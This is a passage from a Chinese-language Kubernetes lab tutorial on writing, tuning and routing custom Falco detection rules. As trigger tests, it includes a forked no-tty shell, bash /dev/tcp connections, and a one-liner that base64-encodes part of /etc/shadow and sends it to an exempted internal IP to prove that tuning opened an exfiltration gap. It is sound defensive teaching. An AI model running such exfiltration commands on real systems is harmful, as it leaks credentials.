# Day 4: 自己寫規則,然後為誤報付帳

![Falco 官方標誌](../assets/logos/falco-icon-color.svg){ align=right width="95" }

> Day 3 找到預設規則的兩個空白:它不管「這個容器沒連過的位址」,也抓不到「容器裡已經在跑的東西再開一個 shell」。今天用 `list`、`macro`、`rule` 三層結構把這兩個洞補起來——但寫出會報的規則只是前半場。後半場是誤報,以及調校誤報必須付出的偵測力。

!!! abstract "你在課程的哪裡"
    - **Day 3**:Falco 裝好了,讀得懂一條規則怎麼從 `condition` 收斂到 syscall 欄位,也知道預設 25 條規則的邊界在哪裡。
    - **今天**:寫兩條規則補上那兩個邊界、刻意製造一次誤報並用 `exceptions` 調校、把告警經 Falcosidekick 送出節點。驗收是自訂規則命中、接收端用自己的日誌證明收到,以及調校前後的數字與代價都量得出來。
    - **Day 5**:換 Tetragon 上場。Falco 這邊的基準就是「25 條預設加 2 條自訂」。

## 寫規則不難,難的是知道它會吵多大聲

今天的六個步驟裡,只有兩個在寫規則:

| 步驟 | 做什麼 |
|---|---|
| 1 | 把規則交給 Falco,並確認它真的載進去了 |
| 2 | 規則 A:補上「沒連過的對外連線」 |
| 3 | 規則 B:補上「非執行期父行程開的 shell」 |
| 4 | **刻意製造誤報,調校,然後把交出去的偵測力量出來** |
| 5 | 把告警送出節點 |
| 6 | 收工,並確認留給下一章的基準 |

步驟 4 是今天真正的重心。一條規則在實驗室裡命中很容易——你知道要做什麼動作才會觸發。難的是把它放進一座有正常流量的叢集,而正常流量會做的事遠比寫規則的人想像的多。

## 步驟 1: 把規則交給 Falco

### 交付路徑

Helm chart 的 `customRules` 是一個 map:**key 是檔名、value 是檔案內容**。chart 用它生一個 ConfigMap,再掛進 pod 的 `/etc/falco/rules.d/`。

規則不要貼進 values 的 YAML 字串裡,用 `--set-file` 從獨立檔案送:

```bash
helm upgrade falco falcosecurity/falco --version 9.1.0 -n falco \
  -f falco-values.yaml \
  --set-file 'customRules.custom-rules\.yaml'=custom-rules.yaml
```

好處很直接:**規則檔是一份獨立、可以單獨 lint、可以單獨 diff 的檔案**,不是 YAML 字串裡的縮排。檔名裡的點要跳脫(`custom-rules\.yaml`),否則 Helm 會把它當成兩層 key。

套用之後長這樣:

```console
$ kubectl -n falco exec <falco-pod> -c falco -- ls -la /etc/falco/rules.d/
lrwxrwxrwx  custom-rules.yaml -> ..data/custom-rules.yaml
drwxr-xr-x  ..2026_08_06_11_08_32.3345389208
lrwxrwxrwx  ..data -> ..2026_08_06_11_08_32.3345389208
```

那兩層 symlink 是 ConfigMap volume 的標準結構(用來做原子更新的),不是異常。

### 三個位置,後面的覆蓋前面的

```console
$ kubectl -n falco exec <falco-pod> -c falco -- grep -A4 rules_files /etc/falco/falco.yaml
rules_files:
- /etc/falco/falco_rules.yaml
- /etc/falco/falco_rules.local.yaml
- /etc/falco/rules.d
```

| 位置 | 誰放的 | 用途 |
|---|---|---|
| `falco_rules.yaml` | init 容器從 OCI registry 拉的 | 預設 25 條,**不要手改**,下次拉新版就被蓋掉 |
| `falco_rules.local.yaml` | 傳統上給人手動編輯的本機覆寫檔 | **這個映像裡根本沒有這個檔案**。Falco 對 `rules_files` 裡不存在的項目是靜靜跳過,不報錯 |
| `rules.d/` | chart 的 `customRules` | 今天的規則在這裡,**最後被解析,所以贏** |

「覆蓋」有三種寫法,這是規則語言裡最容易搞錯的地方:

| 想做的事 | 寫法 | 效果 |
|---|---|---|
| 整條換掉 | `- rule: <同名>` 加完整欄位 | 後解析的完全取代先解析的 |
| 只加條件或例外值 | `- rule: <同名>` 搭配 `override` 語法 | 條件用 `and` 串接,`exceptions` 的 `values` 併入既有的 |
| 關掉一條 | `- rule: <同名>` 搭配 `enabled: false` | 保留定義但不比對 |

今天兩條規則都是**新名字**,所以純粹是加法,預設 25 條一條都沒動。這是刻意的:Day 5 要拿 Tetragon 跟 Falco 對比,改動預設規則會讓對比失去基準。

### 確認規則真的載進去了

Falco 每一個規則檔都會在啟動日誌裡列一行,而且會講 schema 驗證結果:

```console
$ kubectl -n falco logs -l app.kubernetes.io/name=falco -c falco | sed -n '/Loading rules from/,/syscall buffer/p'
Loading rules from:
   /etc/falco/falco_rules.yaml | schema validation: ok
   /etc/falco/rules.d/custom-rules.yaml | schema validation: ok      ← 自訂規則在這裡
The chosen syscall buffer dimension is: 8388608 bytes (8 MBs)
```

**這一行沒出現,規則就沒載到**——不管 `helm upgrade` 說了什麼。`helm` 只保證 ConfigMap 的內容被寫進去、pod 被重建;它對規則的內容一無所知。[地雷 2](#mine-2) 就是靠這條日誌抓到的。

## 步驟 2: 規則 A——補上「沒連過的對外連線」

[Day 3 的地雷 4](sprint2-day3-falco-basics.md#mine-4):預設 25 條裡跟網路有關的三條全在描述具體手法,沒有一條在管「這個容器以前沒連過這裡」,所以從容器連 8.8.8.8:53 是零告警,而 Day 2 的手工基線抓得到。

今天把「基線」這個概念,用 Day 3 學到的三層結構寫出來:

```bash
cat > custom-rules.yaml <<'EOF'
# --- Rule A: outbound connections to peers outside the allow list ---

# Layer 1: plain data. This list IS the baseline.
- list: ebpf_lab_allowed_peers
  items: [1.1.1.1]

# Layer 2: named condition fragments.
- macro: ebpf_lab_workload
  condition: (k8s.ns.name = "ebpf-lab")

- macro: lab_outbound_connect
  condition: >
    (evt.type = connect
     and (fd.typechar = 4 or fd.typechar = 6)
     and (evt.rawres >= 0 or evt.res = EINPROGRESS))

- macro: connection_to_unlisted_peer
  condition: (lab_outbound_connect and not fd.sip in (ebpf_lab_allowed_peers))

# Layer 3: the rule.
- rule: Unexpected outbound connection from lab workload
  desc: A workload in the lab namespace connected to a peer that is not on the allow list.
  condition: ebpf_lab_workload and container and connection_to_unlisted_peer
  output: >
    Outbound connection to unlisted peer
    (peer=%fd.sip:%fd.sport proto=%fd.l4proto proc=%proc.name cmd=%proc.cmdline
    pod=%k8s.pod.name ns=%k8s.ns.name container=%container.name
    image=%container.image.repository)
  priority: WARNING
  tags: [network, custom, sprint2_day4, mitre_command_and_control, T1071]
EOF
```

三層各自的必要性,Day 3 講的是形狀,這裡講為什麼:

- **`list` 是唯一會頻繁改的東西。** 應用多一個上游依賴,改的是 `items`,`macro` 與 `rule` 一個字不動。把 IP 直接寫進 `condition` 的規則,每次改都要重讀整條布林運算式。
- **`macro` 讓 `condition` 讀起來像一句話。** `ebpf_lab_workload and container and connection_to_unlisted_peer` 這一行是**意圖**;`evt.rawres >= 0 or evt.res = EINPROGRESS` 這種東西是**實作**,該藏在 macro 裡。
- **`rule` 只剩下三件事**:什麼情況、報什麼、多嚴重。

寫這條規則時最自然的念頭是直接複用預設的 `outbound` macro。**不要**,原因是[地雷 3](#mine-3)。

### 命中

```console
$ kubectl -n ebpf-lab exec baseline-nginx -- bash -c 'exec 3<>/dev/tcp/8.8.8.8/53 && echo connect-ok'
connect-ok
```

```json
{
  "rule": "Unexpected outbound connection from lab workload",
  "priority": "Warning",
  "hostname": "<node-a>",
  "tags": ["T1071","custom","mitre_command_and_control","network","sprint2_day4"],
  "output_fields": {
    "fd.sip": "8.8.8.8", "fd.sport": 53, "fd.l4proto": "tcp",
    "proc.name": "bash",
    "proc.cmdline": "bash -c exec 3<>/dev/tcp/8.8.8.8/53 && echo connect-ok",
    "container.id": "41ae0eb6f163", "container.name": "nginx",
    "k8s.pod.name": "baseline-nginx", "k8s.ns.name": "ebpf-lab"
  }
}
```

**逐字就是 Day 3 那個零告警的動作。** Day 2 的產出是「連線清單多了一筆沒見過的位址,請人判斷」;今天的產出是一條具名、帶 MITRE T1071 分類、帶 pod 身分的 Warning。

## 步驟 3: 規則 B——補上「非執行期父行程開的 shell」

[Day 3 的地雷 6](sprint2-day3-falco-basics.md#mine-6):`Terminal shell in container` 要求 `container_entrypoint`(父行程是 runc、containerd-shim、conmon),所以只抓得到執行期直接生的第一層 shell。容器裡已經在跑的東西再開 shell,一筆都不報。

規則 B 是它的**完全補集**:同一組 shell 執行檔,父行程條件反過來。

```bash
cat >> custom-rules.yaml <<'EOF'

# --- Rule B: the complement of the shipped container_entrypoint condition ---

- list: lab_shell_binaries
  items: [ash, bash, csh, ksh, sh, tcsh, zsh, dash]

- macro: container_runtime_parent
  condition: >
    (proc.pname in (runc:[0:PARENT], runc:[1:CHILD], runc, docker-runc, exe,
                    docker-runc-cur, containerd-shim, systemd, crio, conmon))

- rule: Shell spawned by non-runtime parent in container
  desc: A shell was spawned by a process already running inside the container.
  condition: >
    spawned_process and container
    and k8s.ns.name = "ebpf-lab"
    and proc.name in (lab_shell_binaries)
    and proc.pname exists
    and not container_runtime_parent
  output: >
    Shell spawned by a non-runtime parent
    (shell=%proc.name parent=%proc.pname gparent=%proc.aname[2] tty=%proc.tty
    cmd=%proc.cmdline pod=%k8s.pod.name ns=%k8s.ns.name container=%container.name)
  priority: WARNING
  tags: [shell, custom, sprint2_day4, mitre_execution, T1059]
EOF
```

兩個設計決定要講清楚:

- **`condition` 裡沒有 `proc.tty != 0`。** 預設規則有這一項,而它正是 [Day 3 地雷 3](sprint2-day3-falco-basics.md#mine-3) 的成因。web shell **沒有終端機**,加了 tty 條件就等於把要抓的目標排除掉。代價是這條規則也會抓到沒有終端機的自動化行為。
- **`proc.pname exists` 不能省。** `container_entrypoint` 的第一項就是 `not proc.pname exists`(父行程可能已經先退出);如果不要求父行程存在,那些父行程為空的事件會落進 `not container_runtime_parent` 而被誤判成非執行期。

### 驗證要用 `&` fork,不是巢狀 `bash -c`

[Day 3 的地雷 6](sprint2-day3-falco-basics.md#mine-6) 記了一個假動作:用巢狀 `bash -c '<單一指令>'` 驗證會得到「兩筆都報」的假答案,因為 bash 的 implicit exec 讓內層**取代**外層而不是 fork。要真的 fork 得加 `&`:

```console
$ script -q /dev/null kubectl -n ebpf-lab exec -it baseline-nginx -- \
      bash -c 'bash -c "echo forked-shell-ran" & wait; echo done'
forked-shell-ran
done
```

同一次動作、兩次 `bash` 的 `execve`、**兩條規則各抓一半**:

| 規則 | `proc.name` | `proc.pname` | `proc.tty` |
|---|---|---|---|
| `Terminal shell in container`(預設) | bash | **containerd-shim** | 34816 |
| `Shell spawned by non-runtime parent in container`(自訂) | bash | **bash** | 34816 |

預設規則抓到第一層,自訂規則抓到被 fork 出來的第二層。Day 3 那個「2 次 `execve`、1 筆告警」的缺口補起來了。

### 更接近真實的版本:沒有終端機的 web shell

上面那次因為包了 `script(1)`,fork 出來的 shell 繼承了 pty。真正的 web shell 不會有終端機。把 `script` 與 `-it` 拿掉再做一次:

```console
$ kubectl -n ebpf-lab exec baseline-nginx -- bash -c 'bash -c "echo webshell-no-tty" & wait; echo done'
webshell-no-tty
done

$ ./falco-alerts.sh --since 15s
Shell spawned by non-runtime parent in container   proc=bash pname=bash tty=0   cmd=bash -c echo webshell-no-tty
--- 預設規則: 0 筆 ---
```

**預設規則這次連第一層都沒報**——沒有 tty,`proc.tty != 0` 不成立(Day 3 地雷 3);第二層又卡在 `container_entrypoint`(Day 3 地雷 6)。**兩顆地雷疊在一起,就是 Falco 對「腳本化的入侵」完全靜音。** 自訂規則報了,而且 `tty=0` 這個值本身就是它跟真人 `kubectl exec -it` 的區分訊號。

這一段也順手回答了「規則 B 該不該加 tty 條件」:**加了就等於重新造一次 Day 3 的地雷 3。**

## 步驟 4: 誤報,以及為誤報付的帳

規則 A 的第一版是能用的,也是**錯的**——它把「不在清單上的對端」等同於「可疑」,而 Kubernetes 裡一個正常 pod 每天要連的東西遠比開發者想的多。

### 刻意製造誤報

部署一顆什麼壞事都沒做的 pod:解析一個叢集內 Service 名稱、GET 它、睡 2 秒、重複。

```bash
cat > legit-client.yaml <<'EOF'
apiVersion: v1
kind: Pod
metadata:
  name: legit-client
  namespace: ebpf-lab
spec:
  containers:
    - name: client
      image: mcr.microsoft.com/mirror/docker/library/python:3.11-slim
      command: ["python3", "-u", "-c"]
      args:
        - |
          import time, urllib.request
          while True:
              try:
                  urllib.request.urlopen(
                      "http://webhook-receiver.falco.svc.cluster.local:8080/ping").read()
              except Exception as exc:
                  print("request failed:", exc, flush=True)
              time.sleep(2)
      resources:
        requests:
          cpu: 10m
          memory: 32Mi
EOF
kubectl apply -f legit-client.yaml
```

一顆每 2 秒發一次請求的 pod,也就是每分鐘 30 次。量測告警率:

```console
$ ./alert-rate.sh 120
window start 2026-08-06T11:10:51Z, 120s
window end   2026-08-06T11:12:51Z
--- 360 alert(s) in 120s = 180.0 alerts/min
   360  Unexpected outbound connection from lab workload
```

**180 alerts/min。** 30 次請求對上 180 筆告警,六倍——原因是[地雷 4](#mine-4)。

量測腳本要注意窗口怎麼劃:

```bash
cat > alert-rate.sh <<'EOF'
#!/usr/bin/env bash
# Count Falco alerts inside a fixed window, using each alert's own timestamp.
# kubectl --since is evaluated per pod, so two Falco pods would use skewed windows.
set -euo pipefail
SECS="${1:-120}"
START=$(date -u -v-"${SECS}"S +%Y-%m-%dT%H:%M:%SZ 2>/dev/null \
        || date -u -d "-${SECS} seconds" +%Y-%m-%dT%H:%M:%SZ)
END=$(date -u +%Y-%m-%dT%H:%M:%SZ)
echo "window start $START, ${SECS}s"; echo "window end   $END"
LINES=$(kubectl -n falco logs -l app.kubernetes.io/name=falco -c falco \
          --since="$((SECS + 30))s" --prefix=false 2>/dev/null | grep '"rule"' || true)
IN=$(echo "$LINES" | awk -v s="$START" -v e="$END" \
      'match($0,/"time":"[^"]*"/){t=substr($0,RSTART+8,RLENGTH-9); if(t>=s&&t<=e) print}')
N=$(echo "$IN" | grep -c . || true)
echo "--- $N alert(s) in ${SECS}s = $(echo "scale=1; $N*60/$SECS" | bc) alerts/min"
echo "$IN" | sed -n 's/.*"rule":"\([^"]*\)".*/\1/p' | sort | uniq -c | sort -rn
EOF
chmod +x alert-rate.sh
```

### 用 `exceptions` 調校,而不是在 `condition` 尾巴接 `and not`

Falco 的 `exceptions` 是規則的一等公民欄位。Falco 會替每個區塊在 `condition` 後面自動接一段 `and not (<fields> <comps> <values>)`。

```yaml
- rule: Unexpected outbound connection from lab workload
  # …condition / output / priority 不變…
  exceptions:
    - name: cluster_dns_resolution
      fields: [fd.sip, fd.sport, fd.l4proto]
      comps: [=, =, =]
      values:
        - ["10.0.0.10", 53, udp]
    - name: known_internal_services
      fields: [fd.sip, fd.sport, fd.l4proto]
      comps: [=, =, =]
      values:
        - ["10.0.47.134", 8080, tcp]
```

效果跟直接在 `condition` 尾巴接 `and not (fd.sip = "10.0.0.10" and …)` 一樣。差別全都在**維護**上:

| | 塞進 `condition` | 用 `exceptions` |
|---|---|---|
| **具名** | 沒有名字。半年後看到 `and not (fd.sip="10.0.0.10" …)`,沒人知道為什麼加、誰加的 | `name: cluster_dns_resolution` 就是理由,稽核時可以逐條問「這條還需要嗎」 |
| **可追加** | 要新增一個豁免對端,必須編輯原檔、改動那條布林運算式 | 官方的覆寫語法可以只追加 `values`,原規則檔一個字不動 |
| **可審查** | diff 是「一行超長條件變成另一行更長的條件」 | diff 是「某個具名例外多了一列 values」,審查的人一眼看得出豁免範圍擴大了多少 |
| **結構化** | 純文字 | `fields`／`comps`／`values` 有結構,可以用程式檢查(例如禁止任何例外拿整段 CIDR 當值) |

第二列在多團隊的叢集裡是決定性的:**平台團隊維護規則,應用團隊只追加自己的豁免。**

### 調校後

```console
$ ./alert-rate.sh 120
window start 2026-08-06T11:16:11Z, 120s
window end   2026-08-06T11:18:11Z
--- 0 alert(s) in 120s = 0.0 alerts/min
```

`legit-client` 全程還在跑,流量一模一樣。而真正的偏離照樣報:

| | 調校前 | 調校後 |
|---|---|---|
| `legit-client` 正常流量 | **180.0 alerts/min** | **0.0 alerts/min** |
| 連 8.8.8.8:53(真偏離) | 命中 | **命中** |
| fork shell(規則 B) | 命中 | **命中** |

看起來是完美的調校。它不是——代價見[地雷 5](#mine-5),而且那個代價是量得出來的。

## 步驟 5: 把告警送出節點

到目前為止告警只在 Falco 的標準輸出裡。要送出去,官方的元件是 Falcosidekick:一份輸入、扇出到數十種目的地。

### 接收端放在叢集內

**不接任何外部目的地、不放任何憑證**——Slack、Teams、PagerDuty、SMTP 全部需要 token 或密碼,而範例設定不放真實憑證。所以接收端是一顆自己寫的 python `http.server`,做兩件事:回 200、把收到的 JSON 印到自己的標準輸出。

```bash
cat > webhook-receiver.yaml <<'EOF'
apiVersion: v1
kind: ConfigMap
metadata:
  name: webhook-receiver-src
  namespace: falco
data:
  receiver.py: |
    import json
    from http.server import BaseHTTPRequestHandler, HTTPServer

    class Handler(BaseHTTPRequestHandler):
        def do_POST(self):
            body = self.rfile.read(int(self.headers.get("Content-Length", 0)))
            try:
                print("RECEIVED", json.dumps(json.loads(body)), flush=True)
            except json.JSONDecodeError:
                print("RECEIVED(raw)", body.decode("utf-8", "replace"), flush=True)
            self.send_response(200)
            self.end_headers()

        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"ok")

        def log_message(self, *args):
            pass

    HTTPServer(("", 8080), Handler).serve_forever()
---
apiVersion: apps/v1
kind: Deployment
metadata:
  name: webhook-receiver
  namespace: falco
spec:
  replicas: 1
  selector:
    matchLabels: { app: webhook-receiver }
  template:
    metadata:
      labels: { app: webhook-receiver }
    spec:
      containers:
        - name: receiver
          image: mcr.microsoft.com/mirror/docker/library/python:3.11-slim
          command: ["python3", "-u", "/src/receiver.py"]
          ports:
            - containerPort: 8080
          volumeMounts:
            - { name: src, mountPath: /src }
          resources:
            requests: { cpu: 10m, memory: 32Mi }
      volumes:
        - name: src
          configMap: { name: webhook-receiver-src }
---
apiVersion: v1
kind: Service
metadata:
  name: webhook-receiver
  namespace: falco
spec:
  selector: { app: webhook-receiver }
  ports:
    - port: 8080
      targetPort: 8080
EOF
kubectl apply -f webhook-receiver.yaml
```

### 打開路由

```yaml
falcosidekick:
  enabled: true
  webui:
    enabled: false
  # The chart ships no resources block at all — see mine 6.
  resources:
    requests: { cpu: 20m, memory: 32Mi }
    limits:   { cpu: 200m, memory: 128Mi }
  config:
    debug: true
    webhook:
      address: "http://webhook-receiver.falco.svc.cluster.local:8080/"
      minimumpriority: "notice"
```

`falcosidekick.enabled=true` 一開,chart 會自動把 Falco 的 `http_output` 指到 sidekick 的 Service,**不需要自己改 Falco 的設定**。Falco 的標準輸出也照樣寫,所以 Day 3 的 `falco-alerts.sh` 完全不用改。

**Web UI 需要 Redis,這裡跳過**:`falcosidekick.webui` 會另外拉一個 Redis Deployment 加一個 UI Deployment。在一座 system 節點 CPU 已配置九成以上的叢集上([Day 3 地雷 1](sprint2-day3-falco-basics.md#mine-1)),為了「可以在瀏覽器上翻告警列表」多兩顆 pod,今天沒有任何步驟需要它。這是取捨,不是能力限制。

### 證據只採信接收端自己的日誌

```console
$ kubectl -n falco logs deploy/webhook-receiver | grep -c RECEIVED
964
```

一筆規則 A 的告警,逐字是接收端印出來的:

```json
{
 "uuid": "41598610-9dfc-406f-a573-639e254146ed",
 "rule": "Unexpected outbound connection from lab workload",
 "priority": "Warning",
 "time": "2026-08-06T11:18:21.921821552Z",
 "hostname": "<node-a>",
 "tags": ["", "T1071", "custom", "mitre_command_and_control", "network", "sprint2_day4"],
 "output_fields": {
   "fd.sip": "8.8.8.8", "fd.sport": 53, "fd.l4proto": "tcp",
   "proc.name": "bash",
   "container.id": "41ae0eb6f163", "container.name": "nginx",
   "k8s.pod.name": "baseline-nginx", "k8s.ns.name": "ebpf-lab"
 }
}
```

三段路徑各有各的證據,而且**最後一段刻意不採信 Falco 或 sidekick 的說法**——否則證明的只是「有東西被送出去」,不是「東西送達了」:

| 段 | 證據 |
|---|---|
| Falco → sidekick | sidekick 日誌的 `[DEBUG] : Falco's payload : {…}` |
| sidekick → 接收端 | sidekick 日誌的 `[INFO] : Webhook - POST OK (200)` |
| **接收端真的拿到了** | **接收端自己的標準輸出 `RECEIVED {…}`,964 次** |

### sidekick 多給了什麼、又要了什麼

**多給的:**

- **`uuid`。** 對照 Falco 自己輸出的 JSON key(`hostname`、`output`、`output_fields`、`priority`、`rule`、`source`、`tags`、`time`)——**沒有 `uuid`**。sidekick 替每一筆事件生一個唯一 ID,這是下游做去重(同一事件送往多個目的地)與交叉引用(工單系統關聯回原始事件)的鉤子。
- **扇出。** 一份輸入、數十個目的地各自獨立開關。Falco 本身的 `http_output` 只能有一個位址。
- **依 priority 過濾。** 每個目的地各自的 `minimumpriority`,例如 webhook 收 notice 以上、呼叫器只收 critical。

**要走的:**

| 成本 | 實測 |
|---|---|
| 多的 pod | **2 顆**(chart 預設 `replicaCount: 2`,見[地雷 6](#mine-6)) |
| 資源 | 每顆 1m CPU、13–20Mi,比 Falco 本體小一個數量級 |
| 多一個要顧的元件 | sidekick 掛掉等於告警送不出去,而 **Falco 一切正常、DaemonSet 全綠** |
| 多一段設定 | webhook 位址、priority 門檻,真實環境還有憑證 |

最後一列是重點:**sidekick 是 Deployment,不是 DaemonSet。** 它是整條告警鏈上唯一的集中點,也是唯一會讓「偵測正常但沒人知道」發生的地方。

## 誠實的差距

- **`minimumpriority` 設了但沒被驗證。** 實驗期間沒有產生 informational 或 debug 等級的事件,所以「低於門檻的會被擋掉」這件事沒有實測過。
- **追加式覆寫沒有實作。** 上面那張表提到官方語法可以只追加 `exceptions` 的 `values` 而不動原規則檔,這是官方文件寫的能力,那條路徑沒有跑過。
- **告警去向只驗到叢集內的 webhook。** 真實環境常見的 Slack、SIEM、物件儲存全部沒接——它們都需要憑證,不適合放進教材。扇出的能力是設定層的,這裡只證明了「一個目的地收得到」。
- **調校後的規則沒有長時間觀察。** 0 alerts/min 是 120 秒窗口的結果,不是跑一週的結果。
- **兩個 `exceptions` 寫死了 ClusterIP。** 其中一個指向的 Service 在收工時已經刪掉,那條例外從此指向一個不存在的位址——無害但無效。這本身就是「例外需要定期回頭審查」的實例。

## 驗收 checkpoint

| 驗證 | 判準 | 本課環境的結果 |
|---|---|---|
| 自訂規則載入 | 啟動日誌出現 `/etc/falco/rules.d/custom-rules.yaml \| schema validation: ok`,且**沒有 warning 區塊** | 修掉 `evt.dir` 之後成立 |
| 規則 A 命中 | Day 3 零告警的那個動作(連 8.8.8.8:53)產生具名告警 | 命中,帶 `fd.sip`／`fd.sport` 與 pod 身分 |
| 規則 B 命中 | `&` fork 出來的第二層 shell 產生告警,而預設規則對它靜默 | 兩者並排成立;無 tty 版本預設規則 0 筆、自訂規則 1 筆 |
| **誤報調校前後** | 同一份流量,調校前後的 alerts/min 都量得出來 | **180.0 → 0.0**,同窗口長度 120 秒 |
| 調校後不失能 | 真偏離仍然命中 | 規則 A、規則 B、預設 shell 規則三條全部照樣命中 |
| 調校的代價 | 說得出被豁免之後具體多了哪些不會被抓的動作,而且實測 | 兩個 exfil 形狀的動作,規則 A **兩次都是 0 筆** |
| **送達** | 接收端自己的日誌裡有 payload | `RECEIVED` 964 次,含 sidekick 加上的 `uuid` |

## 地雷記錄

### 地雷 1:規則改一個字,全叢集的 Falco 滾一遍,而滾動期間節點沒有監控 {#mine-1}

**症狀**:只改了規則檔的內容,整個 DaemonSet 卻滾動更新了一遍。

**根因**:Falco 本身支援監看規則檔並熱重載,但 chart 的 pod template 上有一個 annotation:

```text
templates/pod-template.tpl:
    checksum/rules: {{ include (print $.Template.BasePath "/rules-configmap.yaml") . | sha256sum }}
```

內容是 rules ConfigMap 的 sha256。改一個字元,checksum 就變,pod spec 就變,**整個 DaemonSet 滾動更新**。

實測兩次 `helm upgrade`:

| 內容 | 牆鐘時間 |
|---|---|
| 加入 customRules 與 Falcosidekick | 67 秒 |
| **只改規則內容**(加 `exceptions`、拿掉 `evt.dir`) | **71 秒** |

滾動的形狀是一次一顆(DaemonSet 預設 `maxUnavailable: 1`),實測三顆節點上 falco 容器的啟動時刻間隔 24 秒與 21 秒。加上 [Day 3 量到的「容器起來到掛上 probe 要 26 秒」](sprint2-day3-falco-basics.md),每顆節點在自己那一輪裡有**數十秒完全沒有 syscall 監控**,而這期間 `kubectl get ds falco` 一路顯示健康。

三顆節點是 71 秒。**一座 100 節點的叢集,改一個例外的值,就是一場長達數十分鐘、逐節點開洞的滾動更新。**

**修法**只有兩條路,兩條都有代價:

- **直接 patch ConfigMap**(不走 helm):Falco 的檔案監看會熱重載、pod 不重啟,但 Helm release 的狀態跟叢集實際狀態就對不上了,下一次 `helm upgrade` 會把改動蓋掉。
- **接受滾動**:把規則變更當成一次部署來排程,不要在事故處理中途改規則。

**教訓**:**Falco 有熱重載能力,但打包方式把它拿掉了。** 只看 Falco 的文件會以為改規則是零成本的。

### 地雷 2:`evt.dir` 已經淘汰,而規則照樣「載入成功」 {#mine-2}

**症狀**:`helm upgrade` 回報 `STATUS: deployed`,pod 全綠,`schema validation: ok`——一切正常。

規則第一版的 macro 是這樣寫的,這是各種教學文與舊版範例的標準寫法:

```yaml
- macro: lab_outbound_connect
  condition: >
    (evt.type = connect and evt.dir = <
     and (fd.typechar = 4 or fd.typechar = 6)
     and (evt.rawres >= 0 or evt.res = EINPROGRESS))
```

**根因**在 Falco pod 的啟動日誌裡,而且只在那裡:

```text
/etc/falco/rules.d/custom-rules.yaml: Ok, with warnings
1 Warnings:
LOAD_DEPRECATED_ITEM (Used deprecated item: field 'evt.dir'):
  due to the drop of enter events, 'evt.dir = <' always evaluates to true,
  and 'evt.dir = >' always evaluates to false. The rule expression can be
  simplified by removing the condition on 'evt.dir'
```

Falco 0.44 的 syscall source **不再送 enter 事件**,所以 `evt.dir = <` 恆真、`evt.dir = >` 恆假。

這條規則剛好沒事——恆真等於把它拿掉。**但把不等號寫反的人不會這麼幸運**:`evt.dir = >` 會讓整條規則恆假、**永遠不會觸發,而且 helm 全綠、schema 驗證通過、pod 健康**。網路上大量 Falco 規則範例是 0.3x 時代寫的,複製過來就是這個結果。

**修法**:刪掉那個詞。修完之後 warning 區塊整個消失:

```console
Loading rules from:
   /etc/falco/falco_rules.yaml | schema validation: ok
   /etc/falco/rules.d/custom-rules.yaml | schema validation: ok
The chosen syscall buffer dimension is: …          ← 直接接下一行,沒有 warning 區塊
```

**「沒有 warning 區塊」本身就是驗收條件**,而不是「helm 成功」。

### 地雷 3:預設的 `outbound` macro 把私有網段排除掉了 {#mine-3}

**症狀**:複用預設 macro 寫的網路規則,在 Kubernetes 上安靜得不合理。

**根因**:把它倒出來看:

```console
$ kubectl -n falco exec <falco-pod> -c falco -- grep -A9 '^- macro: outbound$' /etc/falco/falco_rules.yaml
- macro: outbound
  condition: >
    ((evt.type = connect or …) and
     (fd.typechar = 4 or fd.typechar = 6) and
     (fd.ip != "0.0.0.0" and fd.net != "127.0.0.0/8"
      and not fd.snet in (rfc_1918_addresses)) and        ← 這一行
     (evt.rawres >= 0 or evt.res = EINPROGRESS))
```

**`not fd.snet in (rfc_1918_addresses)`:目的地是私有網段就不算 outbound。** 在 Kubernetes 上,這一行的意思是**所有 pod 對 pod、pod 對 Service、pod 對 CoreDNS 的流量全部不在視野裡**——因為 Pod CIDR 與 Service CIDR 都是 RFC1918。

這件事在本章有直接的後果:複用 `outbound` 的話,步驟 4 那 180 alerts/min 的誤報**根本不會發生**,一個 `exceptions` 都不用寫。看起來是把規則寫對了,實際上是拿「攻擊者橫向移動到叢集內另一個 Service」這整類行為換掉了誤報。

**修法**:今天的 `lab_outbound_connect` 是自己拼的,刻意**不含**那一行。

**教訓**:**預設 macro 是為預設規則的威脅模型寫的,不是為你的威脅模型寫的。** 複用之前要把它展開讀完。這也是本章最像陷阱的一顆——因為它是**看起來免費的調校**。

### 地雷 4:誤報的量跟應用程式的請求量不成比例 {#mine-4}

**症狀**:一顆每 2 秒發一次請求的 pod(每分鐘 30 次),產生 **180 alerts/min**。六倍。

**根因**:拆開看告警的對端:

```console
150  ('10.0.0.10', 53, 'udp', 'python')     ← CoreDNS
 30  ('10.0.47.134', 8080, 'tcp', 'python') ← 目標 Service 的 ClusterIP
```

30 次 TCP 連線(一次請求一條,合理),但 **150 次 DNS 查詢——一次 HTTP 請求配 5 次 `connect()`**。原因是 Kubernetes 替每個 pod 寫的 `/etc/resolv.conf`:

```text
search <ns>.svc.cluster.local svc.cluster.local cluster.local
options ndots:5
```

`webhook-receiver.falco.svc.cluster.local` 有 4 個點,**小於 `ndots:5`**,所以解析器先把三個 search domain 依序接上去試(那些必然失敗的名字),失敗才試原名;每個名字又各發 A 與 AAAA 兩次查詢。UDP socket 的 `connect()` 一樣是 `connect` syscall,一樣命中規則。

**教訓**:寫規則時腦子裡的模型是「它每 2 秒連一次」,實際是六倍——**而且這個倍數是叢集的 DNS 設定決定的,不是應用程式決定的**。同一支程式換個 namespace、換個 Service 名字長度,倍數就變。**任何用「預估事件率」來評估規則可行性的做法,在 Kubernetes 上都要先把 DNS 放大算進去。**

### 地雷 5:調校一定要付偵測力,把帳算出來 {#mine-5}

**症狀**:誤報從 180 降到 0,真偏離照樣命中——看起來沒有代價。

**根因**:被豁免的兩個對端,現在是兩條免費通道。實測——同樣從 `baseline-nginx`,做兩件明確帶惡意形狀的事:

```console
$ kubectl -n ebpf-lab exec baseline-nginx -- bash -c '
    exec 3<>/dev/udp/10.0.0.10/53 && echo "dns-tunnel-socket-ok"
    exec 4<>/dev/tcp/10.0.47.134/8080 &&
      printf "GET /?leak=$(head -c 24 /etc/shadow | base64 -w0) HTTP/1.0\r\n\r\n" >&4 &&
      head -1 <&4'
dns-tunnel-socket-ok
HTTP/1.0 200 OK

$ ./falco-alerts.sh --since 20s --rules
--- Unexpected outbound connection from lab workload: 0 筆 ---
```

**兩次都是零。** 具體交出去的是:

1. **對 CoreDNS 的 UDP 53 完全開放。** DNS tunnelling(把資料編碼進查詢名稱送出去)是成熟的滲出手法,而 CoreDNS 預設會替叢集外的名字做遞迴解析——這條通道通到外網。
